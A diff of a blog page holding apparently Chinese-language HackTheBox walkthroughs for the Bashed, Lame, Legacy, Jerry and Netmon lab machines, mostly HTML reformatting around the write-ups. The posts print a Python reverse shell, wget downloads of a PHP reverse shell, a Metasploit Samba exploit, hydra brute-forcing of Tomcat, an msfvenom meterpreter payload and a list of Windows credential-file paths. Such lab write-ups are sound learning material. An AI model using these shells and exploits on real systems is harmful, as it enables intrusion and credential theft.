@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html class="has-navbar-fixed-top">
-<head><meta name="generator" content="Hexo 3.9.0">
+<head>
     <meta charset="utf-8">
 <title>HTB-Hack之旅 - cjM00N&#39;s blog</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -10,50 +10,17 @@
 
 
 
-
-
-
-
-    <meta name="description" content="我tcl">
-<meta name="keywords" content="HackTheBox">
-<meta property="og:type" content="article">
-<meta property="og:title" content="HTB-Hack之旅">
-<meta property="og:url" content="https://cjm00n.top/2019/11/24/HTB-Hack之旅/index.html">
-<meta property="og:site_name" content="cjM00N&#39;s blog">
-<meta property="og:description" content="我tcl">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222223354.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222224134.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222224319.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222225216.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222225733.png">
-<meta property="og:image" content="https://cjm00n.top/2019/11/24/HTB-Hack之旅/assets/image-20191222234655668.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222234402.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222235153.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223002733.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223002843.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223102504.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223162212.png">
-<meta property="og:image" content="https://cjm00n.top/2019/11/24/HTB-Hack之旅/assets/image-20191223162405265.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223162543.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223163848.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223182922.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223191210.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223190959.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191224135423.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191224141523.png">
-<meta property="og:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191224143221.png">
-<meta property="og:updated_time" content="2019-12-25T14:33:46.495Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HTB-Hack之旅">
-<meta name="twitter:description" content="我tcl">
-<meta name="twitter:image" content="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222223354.png">
+<meta name="description" content="web && ctf && code">
 
 
 
 
 
-<link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191113175046.png">
+
+
+
+
+<link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png">
 
 
 <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
@@ -66,7 +33,9 @@
 
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
 
+
 <link rel="stylesheet" href="/css/style.css">
+
 
 <script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
 
@@ -77,14 +46,20 @@
     
     
     
-    
-    
-    
-    
+<script async src="https://www.googletagmanager.com/gtag/js?id=false"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'false');
+</script>
+
 
     
 
 
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/rss.xml" title="cjM00N's blog" type="application/atom+xml">
 </head>
 <body>
     
@@ -94,7 +69,7 @@
             <a class="navbar-item navbar-logo" href="/">
                 
                     
-                    cjM00N
+                    <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png" alt="" height="28">
                     
                 
             </a>
@@ -107,13 +82,20 @@
         
         <div class="navbar-menu navbar-start">
             
-            <a class="navbar-item " href="/archives">Archives</a>
+            <a class="navbar-item "
+               href="/archives">Archives</a>
             
-            <a class="navbar-item " href="/categories">Categories</a>
+            <a class="navbar-item "
+               href="/categories">Categories</a>
             
-            <a class="navbar-item " href="/tags">Tags</a>
+            <a class="navbar-item "
+               href="/tags">Tags</a>
             
-            <a class="navbar-item " href="/about">About</a>
+            <a class="navbar-item "
+               href="/friends">Friends</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
             
         </div>
         
@@ -185,9 +167,15 @@
             </div>
             
             
-            <a class="navbar-item" title="GitHub" href="https://github.com/cjm00n/">
+            <a class="navbar-item" title="GitHub" href="https://github.com/cjm00n/" target="_blank" rel="noopener">
                 
                 <i class="fab fa-github"></i>
+                
+            </a>
+               
+            <a class="navbar-item" title="RSS" href="/rss.xml">
+                
+                <i class="fas fa-rss"></i>
                 
             </a>
                
@@ -218,7 +206,7 @@
     </div>
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-        <p>我tcl</p>
+        <html><head></head><body><p>我tcl</p>
 <a id="more"></a>
 
 <h2 id="Machines"><a href="#Machines" class="headerlink" title="Machines"></a>Machines</h2><h3 id="Bashed"><a href="#Bashed" class="headerlink" title="Bashed"></a>Bashed</h3><p>难度是ctf中的白给题</p>
@@ -226,10 +214,10 @@
 <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222223354.png" style="zoom:50%;">
 
 <p>点击phpbash后会跳转到github, 可以看到源码如下</p>
-<p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">ISSET</span>($_POST[<span class="hljs-string">'cmd'</span>])) &#123;</span><br><span class="line">    $output = preg_split(<span class="hljs-string">'/[\n]/'</span>, shell_exec($_POST[<span class="hljs-string">'cmd'</span>].<span class="hljs-string">" 2&gt;&amp;1"</span>));</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($output <span class="hljs-keyword">as</span> $line) &#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> htmlentities($line, ENT_QUOTES | ENT_HTML5, <span class="hljs-string">'UTF-8'</span>) . <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">die</span>();</span><br></pre></td></tr></table></figure></p>
-<p>可以看到直接将命令传入shell, 不过有个<code>2&gt;&amp;1</code>, 会使得一些shell命令不执行</p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">ISSET</span>($_POST[<span class="hljs-string">'cmd'</span>])) {</span><br><span class="line">    $output = preg_split(<span class="hljs-string">'/[\n]/'</span>, shell_exec($_POST[<span class="hljs-string">'cmd'</span>].<span class="hljs-string">" 2>&1"</span>));</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($output <span class="hljs-keyword">as</span> $line) {</span><br><span class="line">        <span class="hljs-keyword">echo</span> htmlentities($line, ENT_QUOTES | ENT_HTML5, <span class="hljs-string">'UTF-8'</span>) . <span class="hljs-string">"<br>"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">die</span>();</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>可以看到直接将命令传入shell, 不过有个<code>2>&1</code>, 会使得一些shell命令不执行</p>
 <p>这里是根据wp一步一步做的, 首先看一下nmap</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/init 10.10.10.68</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/init 10.10.10.68</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>nmap的命令可以参考 <a href="https://github.com/erasin/notes/blob/master/linux/safe/nmap.md" target="_blank" rel="noopener">https://github.com/erasin/notes/blob/master/linux/safe/nmap.md</a></p>
 <ul>
 <li>-sC: 等价于 –script=default, 使用默认类别的脚本进行扫描</li>
@@ -239,33 +227,33 @@
 <p>可以看到结果如下</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222224134.png" alt></p>
 <p>然后探测一下目录</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>结果如下</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222224319.png" alt></p>
 <p>访问一下分别得到</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/dev/phpbash.php</span><br><span class="line">/php/sendmail.php</span><br><span class="line">/uploads/ (NULL)</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/dev/phpbash.php</span><br><span class="line">/php/sendmail.php</span><br><span class="line">/uploads/ (NULL)</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>然后可以通过<code>phpbash</code>来直接执行命令, 首先传一个<a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank" rel="noopener">LinEnum.sh</a>查看一下系统的敏感信息</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># local</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line"># remote</span><br><span class="line">cd uploads</span><br><span class="line">wget http://ip:8000/LinEnum.sh </span><br><span class="line">bash LinEnum.sh</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># local</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line"># remote</span><br><span class="line">cd uploads</span><br><span class="line">wget http://ip:8000/LinEnum.sh </span><br><span class="line">bash LinEnum.sh</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>结果如下</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[00;31m[-] Super user account(s):[00m</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[00;33m[+] We can sudo without supplying a password![00m</span><br><span class="line">Matching Defaults entries for www-data on bashed:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bashed:</span><br><span class="line">    (scriptmanager : scriptmanager) NOPASSWD: ALL</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[00;31m[-] Super user account(s):[00m</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[00;33m[+] We can sudo without supplying a password![00m</span><br><span class="line">Matching Defaults entries for www-data on bashed:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bashed:</span><br><span class="line">    (scriptmanager : scriptmanager) NOPASSWD: ALL</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>看到有个无密码的账号<code>scriptmanager</code></p>
 <p>那我们再反弹个shell, 可以使用系统自带的php文件</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>修改ip和端口后, 在uploads写入</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ip:8000/php-reverse-shell.php</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ip:8000/php-reverse-shell.php</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>然后访问就可以拿到shell了</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222225216.png" alt></p>
 <p>再利用附录的升级方法即可获得交互shell, 然后登录进<code>scriptmanager</code></p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -u scriptmanager bash</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -u scriptmanager bash</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>可以在<code>/</code>下看到有个<code>scripts</code>文件夹, 访问之, 下面有个root权限的文件</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222225733.png" alt></p>
 <p>如果可以看到<code>test.py</code>的原内容的话, 他其实是修改了<code>test.txt</code>, 这就说明<code>test.py</code>的执行其实是由root执行的, 但是我们可以写, 那就将内容改为反弹shell</p>
-<p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> socket,subprocess,os,pty</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="hljs-string">"ip"</span>,port))</span><br><span class="line">os.dup2(s.fileno(),<span class="hljs-number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="hljs-number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="hljs-number">2</span>)</span><br><span class="line">pty.spawn(<span class="hljs-string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> socket,subprocess,os,pty</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="hljs-string">"ip"</span>,port))</span><br><span class="line">os.dup2(s.fileno(),<span class="hljs-number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="hljs-number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="hljs-number">2</span>)</span><br><span class="line">pty.spawn(<span class="hljs-string">"/bin/bash"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>然后本地监听即可</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2334</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2334</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>成功获取root权限</p>
 <h3 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h3><p>首先进行全面的扫描</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –T4 –A –v targethost</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –T4 –A –v targethost</span><br></pre></td></tr></tbody></table></figure><p></p>
 <ul>
 <li>-T4: T表示速度(0-5), 值越大则越快</li>
 <li>-v: 显示冗余信息</li>
@@ -274,20 +262,20 @@
 <p>扫描结果如下, 可以看到有21和139和445应该是可以打的</p>
 <p><img src="assets/image-20191222234655668.png" alt="image-20191222234655668"></p>
 <p>尝试了一下21端口的vsftpd 2.3.3还真的没打通—, wp诚不欺我</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explort/unix/ftp/vsftpd_234_backdoor</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explort/unix/ftp/vsftpd_234_backdoor</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222234402.png" alt></p>
 <p>老老实实跟着wp打</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2007-2447</span><br><span class="line">use exploit/multi/samba/usermap_script </span><br><span class="line">set RHOSTS 10.10.10.3</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2007-2447</span><br><span class="line">use exploit/multi/samba/usermap_script </span><br><span class="line">set RHOSTS 10.10.10.3</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>然后就是root了</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191222235153.png" alt></p>
 <h3 id="Legacy"><a href="#Legacy" class="headerlink" title="Legacy"></a>Legacy</h3><p>跟前一题很像, 还是nmap开局</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T2 -A -v -oA nmap/init 10.10.10.3</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T2 -A -v -oA nmap/init 10.10.10.3</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223002733.png" alt></p>
 <p>xp的机器, 开了smb, 这里可以用<code>MS-08-067</code>来打</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223002843.png" alt></p>
 <p>理想是丰满的, 这一步我卡了很久很久(国内网络太差了)</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223102504.png" alt></p>
-<h3 id="Jerry"><a href="#Jerry" class="headerlink" title="Jerry"></a>Jerry</h3><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/init 10.10.10.95</span><br></pre></td></tr></table></figure></p>
+<h3 id="Jerry"><a href="#Jerry" class="headerlink" title="Jerry"></a>Jerry</h3><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/init 10.10.10.95</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223162212.png" alt></p>
 <p><code>8080</code>开放, 访问它, gogo</p>
 <p>可以看到是默认的tomcat页面, 有三个选项</p>
@@ -297,51 +285,53 @@
 <blockquote>
 <p>这里其实账号和密码都是明文的, 但是一般还是不会直接给出的, 所以这里还是按照wp的步骤爆破</p>
 </blockquote>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install seclists</span><br><span class="line">hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install seclists</span><br><span class="line">hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223163848.png" alt></p>
 <p><code>admin:admin</code>不成功, 但是不知道为啥hydra给出来了, 我们这里使用<code>tomcat:s3cret</code>登录</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223182922.png" alt></p>
 <p>登录进来后有了部署权, 可以传jsp马来getshell</p>
 <p>首先使用<code>msfvenom</code>创建一个反弹shell的war马</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=2334 -f war -o jerry.war</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=2334 -f war -o jerry.war</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>然后查看一下包里面的jsp文件地址</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">cd tmp &amp;&amp; unzip ../jerry.war</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">cd tmp && unzip ../jerry.war</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223191210.png" alt></p>
 <p>再部署到tomcat上面, 本地msf监听一下</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfdb run</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST tun0</span><br><span class="line">set LPORT 2334</span><br><span class="line">run  # run -j 后台启动</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfdb run</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST tun0</span><br><span class="line">set LPORT 2334</span><br><span class="line">run  # run -j 后台启动</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>访问tomcat上面的地址, 就可以在本地接到shell了, 下面是flag</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191223190959.png" alt></p>
 <p>ippsec的视频做的真的好, 强烈建议看一看</p>
-<h3 id="Netmon"><a href="#Netmon" class="headerlink" title="Netmon"></a>Netmon</h3><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/init 10.10.10.152</span><br></pre></td></tr></table></figure></p>
+<h3 id="Netmon"><a href="#Netmon" class="headerlink" title="Netmon"></a>Netmon</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/init 10.10.10.152</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191224135423.png" alt></p>
 <p>可以看到有ftp服务, 连上去康康</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.152</span><br><span class="line"># user: Anonymous</span><br><span class="line"># pwd: Anonymous</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.152</span><br><span class="line"># user: Anonymous</span><br><span class="line"># pwd: Anonymous</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>登录之后可以拿到用户的flag</p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191224141523.png" alt></p>
 <p>继续进行信息搜集, 我们可以根据下面的字典进行探测</p>
 <p><a href="https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/" target="_blank" rel="noopener">https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/</a></p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Administrator/NTUser.dat</span><br><span class="line">C:/Documents and 